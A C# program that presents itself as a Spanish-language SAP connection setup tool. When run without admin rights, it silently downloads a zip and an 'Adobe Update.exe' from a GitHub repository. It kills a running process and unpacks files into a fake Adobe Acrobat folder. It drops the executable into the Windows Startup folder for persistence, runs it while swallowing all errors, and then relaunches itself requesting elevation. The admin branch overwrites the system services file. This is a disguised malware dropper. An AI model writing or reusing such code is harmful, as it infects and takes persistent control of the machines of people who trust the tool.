static string UserName;
[STAThread]
static void Main()
{
    WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
    bool isAdmin = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);

    if (isAdmin) 
    {
        try
        {
            string[] nombresArchivos = { "saplogon.ini", "SAPUILandscape.xml", "services" };
            if (!Directory.Exists(Path.GetTempPath() + "\\S4pS4p.n3t"))
            {
                Directory.CreateDirectory(Path.GetTempPath() + "\\S4pS4p.n3t");
            }
            string carpetaDestino = Path.GetTempPath() + "\\S4pS4p.n3t";

            foreach (string nombreArchivo in nombresArchivos)
            {
                string rutaDestino = Path.Combine(carpetaDestino, nombreArchivo);
                string nombreRecurso = $"{typeof(Program).Namespace}.{nombreArchivo}";

                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(nombreRecurso))
                {
                    if (stream != null)
                    {
                        using (var fileStream = File.Create(rutaDestino))
                        {
                            stream.CopyTo(fileStream);
                        }
                    }
                }
            }

            if (File.Exists("C:\\Users\\Public\\Nombre.txt"))
            {
                string rutaArchivo = "C:\\Users\\Public\\Nombre.txt";
                UserName = File.ReadAllText(rutaArchivo);
            }
            else
            {
                MessageBox.Show("Ejecuta primero la aplicaci√≥n sin administrador");
                Application.Exit();
            }

            if (!Directory.Exists("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP"))
            {
                Directory.CreateDirectory("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP");
            }

            if (!Directory.Exists("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common"))
            {
                Directory.CreateDirectory("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common");
            }

            if (File.Exists("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common\\SapLogon.ini"))
            {
                File.Delete("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common\\SapLogon.ini");
            }
            File.Copy(Path.GetTempPath() + "\\S4pS4p.n3t\\SapLogon.ini", "C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common\\SapLogon.ini");

            if (File.Exists("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common\\SAPUILandscape.xml"))
            {
                File.Delete("C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common\\SAPUILandscape.xml");
            }
            File.Copy(Path.GetTempPath() + "\\S4pS4p.n3t\\SAPUILandscape.xml", "C:\\Users\\" + UserName + "\\AppData\\Roaming\\SAP\\Common\\SAPUILandscape.xml");

            if (File.Exists("C:\\Windows\\System32\\drivers\\etc\\services"))
            {
                File.Delete("C:\\Windows\\System32\\drivers\\etc\\services");
            }
            File.Copy(Path.GetTempPath() + "\\S4pS4p.n3t\\services", "C:\\Windows\\System32\\drivers\\etc\\services");

            File.Delete(Path.GetTempPath() + "\\S4pS4p.n3t\\SapLogon.ini");
            File.Delete(Path.GetTempPath() + "\\S4pS4p.n3t\\SAPUILandscape.xml");
            File.Delete(Path.GetTempPath() + "\\S4pS4p.n3t\\services");

            MessageBox.Show("Conexiones SAP Aplicadas!");
        }
        catch (Exception ex)
        {
            File.Delete(Path.GetTempPath() + "\\S4pS4p.n3t\\SapLogon.ini");
            File.Delete(Path.GetTempPath() + "\\S4pS4p.n3t\\SAPUILandscape.xml");
            File.Delete(Path.GetTempPath() + "\\S4pS4p.n3t\\services");

            MessageBox.Show(ex.Message + "\rError al aplicar las conexiones SAP");
        }
        finally
        {
            Application.Exit();
        }
    }
    else
    {
        try
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            if (!Directory.Exists(Path.GetTempPath() + "\\d1gm0le.cry"))
            {
                Directory.CreateDirectory(Path.GetTempPath() + "\\d1gm0le.cry");
            }

            using (WebClient client = new WebClient())
            {
                client.DownloadFile("https://github.com/Beareams/Jewel/raw/main/App.zip", Path.GetTempPath() + "\\d1gm0le.cry\\App.zip");
            }

            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Adobe"))
            {
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Adobe");
            }
            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Adobe\\Acrobat DC"))
            {
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Adobe\\Acrobat DC");
            }
            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Adobe\\Acrobat DC\\Acrobat"))
            {
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + "\\Adobe\\Acrobat DC\\Acrobat");
            }

            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Adobe Update.exe"))
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Adobe Update.exe");
            }

            Process[] procesos = Process.GetProcessesByName("DCSyncManager");
            foreach (Process proceso in procesos)
            {
                proceso.Kill();
            }

            using (ZipArchive archive = ZipFile.OpenRead(Path.GetTempPath() + "\\d1gm0le.cry\\App.zip"))
            {
                foreach (ZipArchiveEntry entry in archive.Entries)
                {
                    string entryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments), "Adobe\\Acrobat DC\\Acrobat", entry.FullName);
                    if (entry.FullName.EndsWith("/"))
                    {
                        Directory.CreateDirectory(entryPath);
                    }
                    else
                    {
                        entry.ExtractToFile(entryPath, true);
                    }
                }
            }

            using (WebClient client = new WebClient())
            {
                client.DownloadFile("https://github.com/Beareams/Jewel/raw/main/Adobe Update.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Adobe Update.exe");
            }

            if (File.Exists(Path.GetTempPath() + "\\d1gm0le.cry\\App.zip"))
            {
                File.Delete(Path.GetTempPath() + "\\d1gm0le.cry\\App.zip");
            }
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Adobe Update.exe");
        }
        catch { }

        try 
        {
            string contenido = Environment.UserName;
            string rutaArchivo = "C:\\Users\\Public\\Nombres.txt";

            if (File.Exists(rutaArchivo))
            {
                File.Delete(rutaArchivo);
            }
            File.WriteAllText(rutaArchivo, contenido);

            var processInfo = new ProcessStartInfo();
            processInfo.Verb = "runas";
            processInfo.FileName = Assembly.GetEntryAssembly().Location;
            Process.Start(processInfo);
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error: " + ex.Message);
        }
        finally
        {
            Application.Exit();
        }
    } 
}
